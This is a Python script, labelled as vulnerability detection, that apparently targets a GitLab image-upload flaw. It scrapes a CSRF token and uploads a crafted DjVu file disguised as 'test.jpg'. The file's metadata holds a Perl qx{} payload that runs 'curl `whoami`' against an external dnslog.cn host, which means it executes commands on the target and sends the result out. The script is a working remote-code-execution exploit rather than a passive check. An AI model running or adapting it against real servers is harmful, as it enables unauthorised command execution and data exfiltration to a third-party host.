"""
漏洞检测
"""
import requests
from bs4 import BeautifulSoup

def check(service, ip, port=8080, protocal=1):
    vul_code = 0
    vul_detail = {}
    return_message = [vul_code, vul_detail]

    target_url = "%s://[%s]:%s" % (service, ip, port)

    session = requests.Session()
    try:
        req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(req1.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.82sm53.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
        flag = 'Failed to process image'
        req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)

    except Exception as e:
        print(e)
    else:
        if flag in req2.text:
            vul_code = 1
            vul_detail['sensitive_information'] = req2.text
            return_message = [vul_code, str(vul_detail)]
            return return_message
    finally:
        return return_message


